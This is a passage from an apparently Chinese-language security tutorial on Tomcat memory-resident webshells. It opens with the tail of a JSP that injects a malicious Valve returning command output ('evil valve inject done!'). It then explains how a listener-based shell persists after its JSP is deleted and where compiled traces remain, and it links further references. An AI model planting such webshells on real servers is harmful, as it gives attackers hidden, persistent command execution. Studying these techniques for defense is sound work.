                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
                this.getNext().invoke(request, response);
            }
        }
    };

    standardPipeline1.addValve(valveBase);

    out.println("evil valve inject done!");
%>



```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229130722086.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229131412313.png)



## others


至于为什么说是内存马，比如上面listenerTrojan.jsp访问一遍后，注册了listener。然后就可以把jsp删掉了，再访问上下文环境就能直接带上参数命令执行。只要服务器不重启就一直运行

不过上述内存马都不是真正意义上的内存马，它们会输出在tomcat的目录下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png)

比如上述运行的jsp，在CTALINA_BASE环境的`work\Catalina\localhost\Servlet_web环境\org\apache\jsp`都有相应的文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png)





关于真正意义上的内存马注入：http://wjlshare.com/archives/1541

借助cc链进行内存马注入





参考：http://wjlshare.com/archives/1529

https://paper.seebug.org/1441/#1_1

参考了Ho1aAs的多篇文章：https://ho1aas.blog.csdn.net/article/details/124120724

https://ho1aas.blog.csdn.net/article/details/124120724
